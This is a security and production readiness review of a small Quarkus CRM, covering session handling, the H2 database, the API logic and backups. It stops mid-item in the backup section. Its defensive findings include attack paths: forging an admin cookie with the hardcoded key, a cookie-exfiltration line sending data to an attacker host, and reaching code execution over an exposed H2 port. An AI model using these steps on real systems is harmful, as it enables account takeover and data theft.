# Production Readiness Review — Small CRM

**Reviewed commit:** `ccd0ab3` (branch `feat/small-crm-poc`) · **Date:** 2026-07-26
**Scope:** full codebase — backend (`src/main/java`), configuration, Flyway migrations, backup
subsystem, Angular frontend (`src/main/webui`), build and operations.
**Method:** static review of every source file, cross-checked against the Quarkus 3.37.4 runtime
classes in the local Maven repository (so framework defaults are verified, not assumed). No code
was executed and no files other than this report were changed.

---

## Verdict

**Not ready for production on real customer data, but much closer than a typical proof of
concept.** The engineering hygiene here is genuinely above average: Flyway owns the schema with
Hibernate in `validate` mode, coverage floors are enforced rather than merely reported, license
and style gates fail the build, `--ignore-scripts` is wired through every install path, and
`assumption.md` / `todo.md` document the scope cuts honestly. Authorization is correct and
complete — every admin endpoint carries a class-level `@RolesAllowed`, and there is no
privilege-escalation path in the application code. There is no SQL injection and no XSS sink in
the frontend.

What blocks production is concentrated in three places:

1. **Authentication configuration.** A hardcoded fallback session encryption key lets anyone forge
   an admin session cookie against a default deployment. The session cookie is also not
   `HttpOnly` and never `Secure`.
2. **Exposure of the database.** `AUTO_SERVER=TRUE` runs an H2 TCP listener guarded only by user
   `sa` with an empty password, which is equivalent to remote code execution for anyone who
   reaches it.
3. **Data-integrity gaps that are silent.** Concurrent edits overwrite each other with no
   conflict, a restore rewrites every audit timestamp, and the appointment double-booking guard
   can be raced.

Six issues are release blockers (below). Most are small, contained changes — the session key,
`HttpOnly`, and `AUTO_SERVER` fixes are a handful of configuration lines between them.

### Findings by severity

| Severity | Count | Area |
| --- | --- | --- |
| Critical | 1 | Security |
| High | 9 | Security (3), Backend (3), Backup (2), Frontend (1) |
| Medium | 17 | Security (5), Backend (5), Backup (2), Frontend (5) |
| Low | 16 | across all areas |

### Release blockers

Fix these before the application touches real customer data. Everything else can be scheduled.

| ID | Title | Effort |
| --- | --- | --- |
| [SEC-1](#sec-1--critical--hardcoded-fallback-session-key-allows-forging-an-admin-session) | Hardcoded fallback session encryption key | 1 line + startup check |
| [SEC-2](#sec-2--high--session-cookie-is-not-httponly) | Session cookie is not `HttpOnly` | 1 line |
| [SEC-3](#sec-3--high--secure-flag-is-never-set-and-x-forwarded-proto-is-not-trusted) | No `Secure` flag / no TLS posture | config + docs |
| [SEC-4](#sec-4--high--h2-auto_servertrue-exposes-a-passwordless-database-listener) | H2 `AUTO_SERVER=TRUE` with passwordless `sa` | 1 line |
| [SEC-5](#sec-5--high--published-default-admin-credentials-with-no-first-run-binding) | Published default admin credentials | small |
| [BAK-1](#bak-1--high--restore-silently-destroys-every-createdat-and-updatedat) | Restore destroys all audit timestamps | small |

---

## 1. Security and authentication

### SEC-1 · Critical · Hardcoded fallback session key allows forging an admin session

**File:** `src/main/resources/application.properties:48`

```properties
quarkus.http.auth.session.encryption-key=${SMALLCRM_SESSION_KEY:change-me-in-production-at-least-16-chars-long}
```

The fallback ships inside the artifact and the application starts happily without
`SMALLCRM_SESSION_KEY` being set. Disassembling
`io.quarkus.vertx.http.runtime.security.PersistentLoginManager` from `quarkus-vertx-http-3.37.4.jar`
confirms exactly what that key protects: it is SHA-256'd into an AES key, and the
`quarkus-credential` cookie is `AES/GCM/NoPadding` over the plaintext `"<expiryMillis>:<username>"`.
There is no server-side session table and no binding to a password, IP address, or nonce.

**Attack.** The key is public — it is in this repository. Against any deployment where the operator
did not set `SMALLCRM_SESSION_KEY`, an attacker encrypts `"<now+8h>:admin"` under
`SHA-256("change-me-in-production-at-least-16-chars-long")`, sets the result as the
`quarkus-credential` cookie, and is authenticated as `admin`. No password, no login request,
nothing in the logs. Quarkus' `JpaTrustedIdentityProvider` then loads the real `ADMIN,USER` roles
from the database for them. This is total compromise: read and export the whole customer database,
restore arbitrary data, create accounts.

`todo.md` lists this as "a real session secret", which understates it — the current state is not a
missing hardening step but a publicly known master key.

**Fix.** Remove the fallback so Quarkus refuses to start without the variable:

```properties
quarkus.http.auth.session.encryption-key=${SMALLCRM_SESSION_KEY}
```

Generate the key from 32 bytes of CSPRNG output. For a friendlier failure, add a `StartupEvent`
observer that rejects any key on a known-bad list and prints how to generate one. Document that
rotating the key invalidates all sessions.

### SEC-2 · High · Session cookie is not `HttpOnly`

**File:** `src/main/resources/application.properties:36-48` — the setting is simply absent.

Verified against `FormAuthConfig` in `quarkus-vertx-http-3.37.4.jar`: `httpOnlyCookie()` carries
`@WithDefault("false")`. The application configures `cookie-same-site`, `timeout`,
`new-cookie-interval` and the page settings but never
`quarkus.http.auth.form.http-only-cookie`, so the `quarkus-credential` cookie is readable from
JavaScript via `document.cookie`.

Note the inconsistency: `AuthResource.java:76` *does* set `.httpOnly(true)` — on the deletion
cookie, which carries no value. The flag is set on the empty cookie and absent on the one that
carries the session.

**Failure scenario.** Any XSS anywhere in the SPA (or in a future third-party widget) escalates
from script execution to silent, permanent account takeover:
`fetch('https://attacker/'+document.cookie)`. Because the cookie is self-contained and there is no
server-side revocation ([SEC-6](#sec-6--medium--password-changes-do-not-invalidate-existing-sessions)),
the stolen cookie keeps working after the victim logs out or changes their password.

**Fix.** `quarkus.http.auth.form.http-only-cookie=true`. The frontend never reads the cookie, so
nothing breaks.

### SEC-3 · High · `Secure` flag is never set, and `X-Forwarded-Proto` is not trusted

**Files:** `src/main/resources/application.properties:16`; absence of any `quarkus.http.ssl.*`,
`quarkus.http.proxy.*`, or `quarkus.http.insecure-requests` keys.

In `FormAuthenticationMechanism` the cookie's secure flag is derived at runtime from
`HttpServerRequest.isSSL()`. The application listens on plain HTTP, so the flag is always false.
Critically, **this is not fixed by putting the app behind a TLS-terminating reverse proxy**:
`quarkus.http.proxy.proxy-address-forwarding` is not enabled, so Quarkus ignores
`X-Forwarded-Proto` and `isSSL()` stays false even in the recommended production topology. The
README documents port, data directory, and session key, but never mentions TLS at all.

**Failure scenario.** An attacker on the same LAN or café Wi-Fi — or one who gets the victim to
load `http://crm.example.com/anything` — captures a session cookie valid for eight hours that
cannot be revoked.

**Fix.** Either terminate TLS in Quarkus (`quarkus.http.ssl.certificate.*` plus
`quarkus.http.insecure-requests=redirect`), or when fronted by a proxy:

```properties
quarkus.http.proxy.proxy-address-forwarding=true
quarkus.http.proxy.allow-x-forwarded=true
quarkus.http.proxy.enable-forwarded-host=true
quarkus.http.auth.form.cookie-secure=true
quarkus.http.header."Strict-Transport-Security".value=max-age=31536000; includeSubDomains
```

Document that the proxy must strip client-supplied `X-Forwarded-*` headers, and add a reverse-proxy
section to the README.

### SEC-4 · High · H2 `AUTO_SERVER=TRUE` exposes a passwordless database listener

**File:** `src/main/resources/application.properties:20-22`

```properties
quarkus.datasource.username=sa
quarkus.datasource.password=
quarkus.datasource.jdbc.url=jdbc:h2:file:${smallcrm.data-dir:./data}/smallcrm;AUTO_SERVER=TRUE;DB_CLOSE_DELAY=-1
```

`AUTO_SERVER=TRUE` makes the first JVM open an H2 TCP server so other processes — explicitly
including processes on other hosts, per the H2 documentation — can attach to the same file. The
only credential is `sa` with an empty password. **This is live in this working copy right now:**
`data/smallcrm.lock.db` contains `server=192.168.54.55:54257`, i.e. the listener is bound to the
machine's LAN address, and the lock file is world-readable (`-rw-r--r--`), so the port is not even
a secret.

**Failure scenario.** Any other local process, or any host that can reach the port, connects with
`jdbc:h2:tcp://host:port/./data/smallcrm` as `sa` with no password. It can read every customer
record and every bcrypt hash for offline cracking, and run
`UPDATE app_user SET roles='ADMIN,USER'` directly. H2 also permits
`CREATE ALIAS ... FOR "java.lang.Runtime.getRuntime"`, so database access here is equivalent to
remote code execution as the application's user. The random port additionally makes firewall rules
impossible to write.

**Fix.** Drop `AUTO_SERVER=TRUE` from the production URL — this is a single-process application and
nothing in the codebase needs a second connecting JVM. Keep it under `%dev` if a second tool is
useful during development. Set a real datasource password
(`quarkus.datasource.password=${SMALLCRM_DB_PASSWORD}`) regardless.

### SEC-5 · High · Published default admin credentials with no first-run binding

**Files:** `src/main/resources/application.properties:58-59`;
`src/main/java/org/smallcrm/security/BootstrapAdminService.java:57-67`; also printed in
`README.md:28,51` and in the shipped end-user manual `docs/manual/index.html:437`.

The bootstrap admin is created at startup with a globally known password. `mustChangePassword=true`
forces *whoever logs in first* to set a new password — it does not ensure that person is the
operator.

**Failure scenario.** An instance is reachable, even briefly, before the operator's first login. An
attacker who knows this product (the credentials are in the public README *and* in the manual
shipped with the application) logs in as `admin`/`changeit`, is prompted to change the password,
sets their own, and owns the installation. The legitimate operator is locked out, and
`BootstrapAdminService` will never re-run because `AppUser.count() > 0`.

**Fix.** Do not ship a default. When `smallcrm.bootstrap.admin.password` is unset, create the admin
with `BcryptUtil.bcryptHash(randomBase64(24))` and log the generated password once at startup so it
appears only in the operator's own console. Remove `changeit` from `application.properties`, the
README table, and the manual.

### SEC-6 · Medium · Password changes do not invalidate existing sessions

**Files:** `src/main/java/org/smallcrm/service/UserService.java:107-113` (`resetPassword`),
`:116-130` (`changeOwnPassword`); `src/main/resources/application.properties:45-46`.

The session cookie carries only `expiry:username`, and the identity provider re-authenticates by
username alone — it never consults the password column. There is no session table, no credential
version, and neither password path touches session state.

**Failure scenario.** An attacker steals a session cookie. The user notices something odd and
changes their password; an admin resets it. Neither action has any effect. Worse, `timeout=PT8H` is
an *idle* timeout renewed every `PT30M` (`new-cookie-interval`), so an attacker who polls any
endpoint every 30 minutes holds the session **indefinitely** — there is no absolute session
lifetime. `POST /api/auth/logout` only expires the cookie in the victim's own browser
(`AuthResource.java:70-79`); the attacker's copy is untouched.

**Fix.** Add a `sessions_valid_from TIMESTAMP` column to `app_user`, set it to `now()` in both
password paths, and reject in `AccountStateFilter` any request whose session predates it. The clean
long-term answer is a small server-side session table behind a custom `HttpAuthenticationMechanism`,
which also makes logout real. Interim mitigation: shorten
`quarkus.http.auth.form.timeout` and add `quarkus.http.auth.form.cookie-max-age` for an absolute
cap.

### SEC-7 · Medium · No brute-force protection or rate limiting on login

**Files:** `src/main/resources/application.properties:50`;
`src/main/java/org/smallcrm/domain/AppUser.java:45-78` (no failed-attempt counter, no lock-until
column); nothing in the codebase observes `FormAuthenticationEvent`.

`POST /api/auth/login` accepts unlimited attempts, and the password policy is only
`@Size(min = 8)`. Usernames are guessable (`admin` is documented) and enumerable
([SEC-13](#sec-13--low--username-enumeration-via-login-timing)). bcrypt cost 10 (~50-80 ms) is the
only brake, allowing tens of thousands of guesses per hour per connection and more in parallel.
Each attempt also consumes a request thread, making the same endpoint a cheap CPU-exhaustion DoS.
Nothing logs authentication failures.

**Fix.** Add `failedLoginCount` and `lockedUntil` columns; observe
`io.quarkus.vertx.http.runtime.security.FormAuthenticationEvent` (present in 3.37.4) to increment
on failure and clear on success, with exponential backoff after roughly five failures. Add per-IP
rate limiting at the reverse proxy and log authentication failures.

### SEC-8 · Medium · Deactivated accounts still authenticate and receive a valid cookie

**Files:** `src/main/java/org/smallcrm/domain/AppUser.java:36,49-56,74-75`;
`src/main/java/org/smallcrm/security/AccountStateFilter.java:37-59`.

`@UserDefinition` generates a lookup by `@Username` only, so `POST /api/auth/login` for a
deactivated account **succeeds**: bcrypt is verified, `200` is returned, and a valid cookie is
issued. Enforcement lives entirely in `AccountStateFilter`, a JAX-RS `ContainerRequestFilter` that
only covers JAX-RS resource paths.

`assumption.md` #7 presents this as a deliberate choice and `todo.md` schedules the fix, which is
fair — but two consequences are worth stating. First, a fired employee has a working oracle
confirming their password is still valid, useful for testing reuse against other systems. Second,
the enforcement is one layer away from the authentication decision: the moment anyone adds a
non-JAX-RS authenticated endpoint (a Vert.x `@Route`, a management path, an entry in
`quarkus.http.auth.permission.*` outside `/api/*`), the deactivated user reaches it, and nothing in
the code makes that coupling visible.

Separately, `AccountStateFilter.java:48-51` **fails open**: when the identity is authenticated but
`AppUser.findByUsername` returns `null`, the filter returns and lets the request through. This is
currently unreachable, but it is the wrong default in a security filter.

**Fix.** Move the check into a `SecurityIdentityAugmentor` that fails authentication when
`!active`, so it applies to every mechanism and path. Keep `AccountStateFilter` for the
`mustChangePassword` allow-list, and change its `user == null` branch to abort with `401`.

### SEC-9 · Medium · No CSRF token, and one mutating endpoint is HTML-form-reachable

**Files:** `src/main/resources/application.properties:47` (`strict`), `:104` (`%dev` → `lax`);
`src/main/java/org/smallcrm/api/BackupResource.java:101-104`.

`todo.md` frames this as belt-and-braces given `SameSite=strict`, which is mostly right — every
JSON endpoint declares `@Consumes(APPLICATION_JSON)`, which an HTML form cannot produce. But there
is one exception:

```java
@POST @Path("/restore-upload")
@Consumes(MediaType.MULTIPART_FORM_DATA)
public Map<String, Object> restoreUpload(@RestForm("file") FileUpload upload)
```

`multipart/form-data` **is** form-submittable, so a plain cross-origin `<form>` can invoke the most
destructive operation in the application — replacing the entire database. `/api/auth/login`
(form-encoded) is likewise submittable, enabling login-CSRF. `SameSite=strict` does hold in current
browsers, so the residual risk is narrow: legacy or embedded browsers that ignore `SameSite`, and
any future relaxation of that setting. It is nonetheless a single-control defense on a
database-destroying endpoint.

**Fix.** Add double-submit CSRF protection (`quarkus-csrf-reactive`, or a token in `/api/auth/me`
echoed as `X-CSRF-Token`) at least for `/api/backups/restore-upload`. Keep `SameSite=strict`.

### SEC-10 · Medium · No security response headers

**File:** `src/main/resources/application.properties` — no `quarkus.http.header.*` entries; a grep
of the source tree found no response-header filter either.

No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, or
`Strict-Transport-Security`. This compounds [SEC-2](#sec-2--high--session-cookie-is-not-httponly)
directly: with no CSP *and* a JS-readable session cookie, a single injected script exfiltrates the
session.

**Fix.**

```properties
quarkus.http.header."X-Frame-Options".value=DENY
quarkus.http.header."X-Content-Type-Options".value=nosniff
quarkus.http.header."Referrer-Policy".value=strict-origin-when-cross-origin
quarkus.http.header."Content-Security-Policy".value=default-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'
```

Verify the CSP against the Angular build; scripts should need no `unsafe-inline`, styles may need a
nonce or hash.

### SEC-11 · Low · bcrypt cost left at the library default of 10

**Files:** `BootstrapAdminService.java:62`; `UserService.java:76,110,127` — all four call the
single-argument `BcryptUtil.bcryptHash(String)`. Disassembly of `BcryptUtil` confirms the default
is 10, the floor of current guidance rather than the target. It sets the offline-cracking cost if
the H2 file or the [SEC-4](#sec-4--high--h2-auto_servertrue-exposes-a-passwordless-database-listener)
port leaks. **Fix:** a `BCRYPT_COST = 12` constant used at all four sites; optionally re-hash on
next successful login when the stored cost is lower.

### SEC-12 · Low · Admin password reset requires no re-authentication

**File:** `UserResource.java:73-77` → `UserService.java:107-113`. `resetPassword` takes only
`newPassword`. Combined with [SEC-6](#sec-6--medium--password-changes-do-not-invalidate-existing-sessions),
a hijacked admin session can silently reset every other account's password. **Fix:** require the
acting admin's current password and verify it with `BcryptUtil.matches`, as `changeOwnPassword`
already does.

### SEC-13 · Low · Username enumeration via login timing

The status code is uniformly `401`, which is right — but the generated identity provider looks the
user up first and only runs bcrypt when a row exists. A non-existent username returns in about a
millisecond; an existing one costs a full cost-10 bcrypt. That is a trivially measurable oracle,
and it feeds [SEC-7](#sec-7--medium--no-brute-force-protection-or-rate-limiting-on-login). **Fix:**
on a lookup miss, verify the supplied password against a fixed dummy hash so both branches take
comparable time.

### SEC-14 · Low · Weak password policy and silent bcrypt truncation

**Files:** `api/dto/ChangePasswordRequest.java:7`, `CreateUserRequest.java`,
`ResetPasswordRequest.java:7`. The only rule is length 8-100 — no common-password blocklist, no
check against the username. Separately, bcrypt hashes at most 72 bytes, so anything beyond that is
silently discarded while the UI accepts 100 characters. **Fix:** raise the minimum to 12, reject
the username as a substring and a top-N common list, and either cap the field at 72 or pre-hash
with SHA-256 before bcrypt.

### SEC-15 · Low · Logout hardcodes the cookie name and fails open if reconfigured

**File:** `AuthResource.java:46,70-79` — `private static final String SESSION_COOKIE =
"quarkus-credential";`. That is the current Quarkus default, so it works today, but the constant is
disconnected from `quarkus.http.auth.form.cookie-name`. If an operator ever sets that property,
logout deletes a non-existent cookie, returns `204`, and leaves the real session fully valid — a
security failure that presents as success. **Fix:** inject the configured name via
`@ConfigProperty`.

---

## 2. Backend API and business logic

### API-1 · High · Optimistic locking exists but is inert — concurrent edits are silent lost updates

**Files:** `domain/BaseEntity.java:46-47`; every write DTO in `api/dto/`; update paths such as
`service/ContactService.java:82-87`.

`BaseEntity` does declare `@Version public long version` — verified. But **no DTO exposes
`version`** (a grep across `api/dto/` returns nothing), and every update is load-then-overwrite
inside one short transaction:

```java
@Transactional
public ContactDto update(Long id, ContactDto input) {
  Contact contact = require(id);   // reads the current version
  apply(input, contact);           // overwrites every field
```

Because the entity is re-read in the same transaction that writes it, the version check can never
fire for the real conflict window — between a user loading the edit form and pressing Save.
`todo.md` records this as "stored but not surfaced", which is accurate; the point here is that the
practical effect in a shared workspace is data loss with no signal.

**Failure scenario.** User A and user B both open contact 7. A saves a corrected phone number. B
saves a note edit a minute later, and B's stale payload silently erases A's phone change. Neither
user sees anything.

**Fix.** Add `version` to each DTO, echo it on GET, and on update compare it
(`if (input.version() != entity.version) throw ...`) or use `entityManager.lock`; map
`OptimisticLockException` to HTTP 409 and have the frontend offer a reload.

### API-2 · High · Appointment double-booking guard is check-then-act and can be raced

**File:** `service/AppointmentService.java:110-118` (create), `126-131` (update), `139-149`
(`guardSlot`), `151-168` (`overlapping`).

```java
guardSlot(owner, appointment.startsAt, appointment.endsAt, null, allowConflict);
appointment.persist();
```

`overlapping()` is a plain `Appointment.list(...)` SELECT — no pessimistic lock, no exclusion
constraint (H2 has none for ranges), no serialization. Under H2's default READ COMMITTED, two
concurrent `POST /api/appointments` for 10:00-11:00 each see zero collisions, both persist, and
both return 201 with `allowConflict=false`. The 409 that is the entire point of the feature never
fires, precisely in the case it exists for.

**Fix.** Serialize check and insert per calendar: take a pessimistic lock on the owner's `app_user`
row (`em.find(AppUser.class, id, PESSIMISTIC_WRITE)`) before `guardSlot`, or use a single-row
advisory-lock table. A JVM-level lock would suffice only if one process ever touches the file,
which `AUTO_SERVER=TRUE` explicitly allows not to be the case.

### API-3 · High · Every list endpoint is unbounded

**Files:** `ContactService.java:65`, `CompanyService.java:46,50`, `DealService.java:55`,
`InteractionService.java:60`, `CrmTaskService.java:66`.

Only the dashboard's `recent(limit)` uses `Page.ofSize`. Everything else materializes the full
table into entities, then DTOs, then one JSON array. `GET /api/interactions` with no filter returns
the entire activity log for the installation's lifetime, which grows monotonically and is never
pruned. The contact search is `lower(col) LIKE '%term%'` (`ContactService.java:55-59`) — an
unindexable full scan on top of an unbounded query.

`assumption.md` #26 argues a self-employed person has hundreds, not millions, of contacts. That is
reasonable for contacts; it does not hold for interactions, which accumulate with every logged call
and e-mail over years. Combined with [API-4](#api-4--medium--n1-query-storm-when-mapping-lists-to-dtos)
this is the most likely performance cliff in the application.

**Fix.** Add `page`/`size` parameters with a server-side maximum (say 200) and a total-count header.
The Panache plumbing is already present.

### API-4 · Medium · N+1 query storm when mapping lists to DTOs

**Files:** all `Dto.from(...)` mappers, e.g. `api/dto/InteractionDto.java`
(`interaction.contact.displayName()`, `interaction.deal.title`, `interaction.owner.username`),
driven from the non-fetching queries in the services.

Associations are correctly `LAZY`, but the DTO mappers dereference up to three per row with no
`join fetch` or entity graph anywhere. Listing 1,000 interactions costs one list query plus up to
3,000 single-row selects (the first-level cache dampens repeats, but each distinct contact and deal
costs a query). `Contact.tags` is additionally `@ElementCollection(fetch = EAGER)`
(`Contact.java:57`), loaded per contact row.

**Fix.** `left join fetch` on the list paths, or set `hibernate.default_batch_fetch_size` and
`@BatchSize` on the collections — the latter is a one-line change that captures most of the win.

### API-5 · Medium · The dashboard sums deal amounts across different currencies

**File:** `service/DashboardService.java:43-49`

```java
"select coalesce(sum(d.amount), 0) from Deal d where d.stage not in :stages"
```

`Deal.currency` is a free per-deal field defaulting to EUR (`DealDto` validates only
`@Size(min=3,max=3)`, no pattern), yet the dashboard adds 10,000 EUR + 10,000 USD + 10,000 JPY into
one `BigDecimal` presented as a single `openDealValue` with no currency. The same bug exists
independently in the frontend's per-stage column totals
([UI-5](#ui-5--medium--deal-column-totals-add-mixed-currencies-and-label-the-sum-eur)).

**Failure scenario.** One USD deal among EUR deals makes the headline pipeline figure simply wrong,
with no indication.

**Fix.** `group by d.currency` and return per-currency sums, or restrict the application to one
configured currency and validate against it (`@Pattern("[A-Z]{3}")` plus a `java.util.Currency`
lookup).

### API-6 · Medium · Deal "pipeline order" sort is alphabetical

**File:** `service/DealService.java:48`, with a javadoc at `:41-46` promising pipeline order.

```java
Sort order = Sort.by("stage").and("expectedCloseDate").and("id");
```

`stage` is persisted as VARCHAR (`@JdbcTypeCode(SqlTypes.VARCHAR)`, `Deal.java:57-60`), so the sort
is lexicographic: **LEAD, LOST, PROPOSAL, QUALIFIED, WON** — not LEAD → QUALIFIED → PROPOSAL →
WON/LOST. `GET /api/deals` returns lost deals wedged between leads and proposals.

**Fix.** Order by a CASE expression, or add an ordinal column to the enum mapping.

### API-7 · Medium · Contact tags bypass length validation and produce a 500

**Files:** `api/dto/ContactDto.java:38` (`Set<String> tags` — no element constraint, verified),
`service/ContactService.java:123-134` (`cleanTags` trims but never checks length),
`V1__initial_schema.sql:72-77` (`tag VARCHAR(50)`).

Every other string field has a `@Size` matching its column. A 60-character tag reaches H2, fails at
flush, and surfaces as a generic 500 instead of the `VALIDATION_FAILED` 400 the rest of the API
produces. **Fix:** `Set<@Size(max = 50) String> tags`, plus an optional cap on collection size.

### API-8 · Medium · Invalid enum query parameters return a bare 404

**Files:** `api/DealResource.java:51,76`; contrast `api/InstantParamConverterProvider.java`.

The codebase already knows this failure mode — the Instant converter's comment notes that a
converter exception "is turned into a misleading 404 by the JAX-RS runtime" — but only `Instant`
got a converter. `GET /api/deals?stage=OPEN` (a typo) returns 404 with a non-`ApiError` body, and
the client reasonably concludes the route does not exist. Invalid enums in JSON bodies likewise
bypass `ApiError` via Jackson's own 400 shape. **Fix:** a `ParamConverterProvider` for enums
mirroring the Instant one, plus a `@ServerExceptionMapper` for `MismatchedInputException`.

### API-9 · Medium · No catch-all exception mapper; duplicate-username race returns 500

**Files:** `api/error/ApiExceptionMappers.java` (maps only four known types);
`service/UserService.java:68-73` (check-then-act on username);
`api/BackupResource.java` (`UncheckedIOException` thrown raw).

Two concurrent `POST /api/users` for the same name both pass `findByUsername`; one hits
`uk_app_user_username` and returns 500 instead of the `USERNAME_TAKEN` 400. Same for
[API-7](#api-7--medium--contact-tags-bypass-length-validation-and-produce-a-500) and a truncated
backup file on download. Quarkus will not leak stack traces in production mode, but the body is not
the `ApiError` shape the frontend is built around. **Fix:** a lowest-priority
`@ServerExceptionMapper(Throwable.class)` returning `ApiError.of("INTERNAL", ...)` with the cause
logged server-side, plus a mapper translating unique-key violations to 409.

### API-10 · Low · Assorted correctness issues

- **"Today" is computed in the server's time zone.** `ClockProducer.java:30`
  (`Clock.systemDefaultZone()`), `CrmTaskService.java:140-142`. A UTC server with a Vienna user
  means that between midnight and 01:00 local, "overdue" and "due today" are off by a day.
  `Appointment.timeZone` is stored but never used in any computation.
- **Entity timestamps bypass the injectable clock.** `BaseEntity.java:58-68` calls `Instant.now()`
  directly, so tests with a fixed clock still get wall-clock `createdAt`/`updatedAt`.
- **Bulk detach updates skip `@Version` and `updatedAt`.** `CompanyService.java:80-86`,
  `ContactService.java:93-101`, `DealService.java:92-99`, `UserService.java:133-149` use bulk JPQL,
  which does not run `@PreUpdate`. Use `update versioned` or set the fields explicitly.
- **`Deal.amount` accepts values H2 rejects.** `api/dto/DealDto.java` has `@PositiveOrZero` but no
  `@Digits`; the column is `NUMERIC(15,2)`, so an 18-digit amount passes validation and fails at
  flush with a 500. Add `@Digits(integer = 13, fraction = 2)`.
- **`AppointmentService.list` javadoc contradicts the code** — `:56-57` says the default `from` is
  the start of the current day; `:60` uses `now − 24h`.
- **`UserService.requireAnotherAdminRemains` (`:155-163`) is itself check-then-act** — two admins
  demoting each other concurrently can leave zero admins. Rare and admin-only, but the same class of
  race as [API-2](#api-2--high--appointment-double-booking-guard-is-check-then-act-and-can-be-raced).
- **Appointments whose owner was deleted drop out of all conflict checks**, since `overlapping()`
  filters on `owner.id`. A reassigned calendar can be double-booked over them silently.
- **`AppUser` has no `@Version` and no `updatedAt`** — concurrent admin edits are last-write-wins.
- **No index supports `interaction.occurredAt DESC` or `crm_task.dueDate`** — both are full-table
  sorts. (H2 auto-indexes FK columns, so the contact/deal filters themselves are covered.)

---

## 3. Backup, restore, and durability

### BAK-1 · High · Restore silently destroys every `createdAt` and `updatedAt`

**Files:** `backup/BackupService.java:227-330` (`replaceAll`); `domain/BaseEntity.java:58-63`.

The backup file faithfully *exports* `createdAt` and `updatedAt` for every record
(`BackupService.java:385-386, 402-403, 418, 432, 448, 468`). But `replaceAll()` never maps them
back — verified by grep: `createdAt` appears in the export paths and the file-listing record, and
nowhere in the restore path. Even if it did, `BaseEntity.onCreate()` would overwrite them
unconditionally:

```java
@PrePersist
void onCreate() {
  Instant now = Instant.now();
  createdAt = now;
  updatedAt = now;
}
```

**Failure scenario.** An admin restores yesterday's backup. Every company, contact, deal,
interaction, task, and appointment now reads "created just now". The next automatic backup — written
about 30 seconds later on the next change — bakes the falsified timestamps in permanently. In a CRM
"when was this contact created, when was it last touched" is business data, and one round trip
rewrites the entire history irreversibly. No test asserts on timestamps, so the suite passes.

**Fix.** Copy `source.createdAt()`/`updatedAt()` onto the entities in `replaceAll`, and guard the
lifecycle callback (`if (createdAt == null) { createdAt = now; }`). Add a round-trip test asserting
timestamps survive.

### BAK-2 · High · Full disaster recovery is impossible from the XML backups alone

**Files:** `backup/BackupService.java:57-64` (design comment), `:240,256,275`
(`usersByName.get(source.owner())`); `application.properties:22,80`.

Excluding `app_user` from the XML is a defensible, documented choice (`assumption.md` #11) — but
nothing compensates for it. The subsystem never snapshots the H2 file; the XML is the only
durability mechanism, and it omits:

- **All user accounts.** After disk loss, a fresh start bootstraps only `admin`. Restoring the XML
  re-links only records owned by `admin`; every other record's owner is silently set to `null`
  (`usersByName.get(...)` returns null for unknown names, with no warning logged — unlike the
  interaction skip at `:285`).
- **`app_setting`** (backup retention, `V3__app_setting.sql`) — reverts to defaults.
- **Record IDs** — fresh identities on restore, breaking any external reference.
- **Original timestamps** ([BAK-1](#bak-1--high--restore-silently-destroys-every-createdat-and-updatedat)).

The default layout also puts `./backup` beside `./data` on the same volume, so one disk failure
takes the database and every backup together.

**Failure scenario.** The disk dies. The operator reinstalls and restores the newest XML from an
off-machine copy. All colleagues' accounts are gone, all records are ownerless, all timestamps are
reset — and the restore reports a cheerful `recordCount`, so the dataset looks complete.

**Fix.** At minimum, state this plainly in the manual and in the restore screen. Better: add a
periodic full snapshot via H2's `BACKUP TO 'file.zip'` (online-safe, includes users), recommend
`SMALLCRM_BACKUP_DIR` on a different volume, and log plus report the count of unresolved owners in
`RestoreResult`.

### BAK-3 · Medium · No concurrency control around restore

**File:** `backup/BackupService.java:339-345` (`restore`), `:218-219` (`replaceAll`).

`restore()` runs three separate units — `parse` (no transaction), `write(true)` (safety copy in its
own transaction, file write outside any), then `replaceAll` (its own transaction) — with no lock and
no maintenance mode. Three consequences:

1. **A silent loss window.** A user request that commits between the safety copy's export and
   `replaceAll`'s delete is wiped by the restore and exists in *neither* the safety copy *nor* any
   automatic backup (the 30-second coalescing window means it likely was not written yet).
2. **Concurrent writes during `replaceAll`** hit FK or concurrent-update errors as 500s.
3. **Two concurrent restores** (a double-click, or two admins) interleave their delete and insert
   phases.

**Fix.** A `ReentrantLock` in `BackupService` around `restore()` and `write()`, with the safety copy
taken inside the guarded section; ideally reject business writes with 503 while a restore is in
flight.

### BAK-4 · Medium · `export()` is not a consistent snapshot

**File:** `backup/BackupService.java:117-135` (`export`), `:280-288` (interaction skip).

`export()` issues six independent `listAll` queries in one `@Transactional` method, but H2's default
isolation is READ COMMITTED, so each query sees a different committed state — and the automatic
backup runs concurrently with live traffic by design.

**Failure scenario.** Companies are read; a user then creates company X, contact Y, and interaction
Z; contacts are read (including Y, whose `companyId` points at the absent X); interactions are read
(including Z). The backup now contains a contact whose company silently disappears on restore, and
in the reverse ordering an interaction whose contact is missing, which `replaceAll` **skips
entirely** with only a `LOG.warnf`. The most recent backup — the one a restore will use — is
internally inconsistent.

**Fix.** Run the export at SERIALIZABLE/snapshot isolation, or reuse the
[BAK-3](#bak-3--medium--no-concurrency-control-around-restore) lock. Surface skipped-record counts
in `RestoreResult` rather than only in a log line.

### BAK-5 · Medium · Backup files are never fsynced

**Files:** `backup/BackupXml.java:62-64` (`Files.writeString`); `BackupService.java:150-160`.

The temp-file plus `ATOMIC_MOVE` pattern protects against a crash mid-write, but `Files.writeString`
never forces data to disk and the directory entry is not fsynced either. On power loss, journaling
filesystems can persist the rename while the contents are still in the page cache — leaving an empty
or truncated `smallcrm-backup-*.xml` with a perfectly valid name that passes `isOwnBackup`, lists
newest-first in the UI, and reveals itself as `BACKUP_UNREADABLE` only at restore time. **Fix:**
write via `FileChannel`, `force(true)` before the move, then fsync the directory.

### BAK-6 · Low · Further backup issues

- **Filename-collision race** (`BackupService.java:487-501`). `uniquePath` is check-then-act, and
  `write()` can run concurrently on the REST worker and the scheduler thread. Both can pick the same
  second-granularity name; `ATOMIC_MOVE` maps to `rename(2)`, which silently replaces the target.
  The [BAK-3](#bak-3--medium--no-concurrency-control-around-restore) lock fixes this for free.
- **Pending coalesced backup discarded on shutdown** (`AutoBackupTrigger.java:75-77,107-113`).
  `shutdownNow()` drops a scheduled-but-unrun backup, so a change made just before a service stop
  never reaches a file — which bites exactly the "stop the service, copy the backup folder off the
  machine" workflow. Run `writeNow()` synchronously first.
- **`restoreFromFolder` reads the whole file before any size check** (`:348-355`, limit at
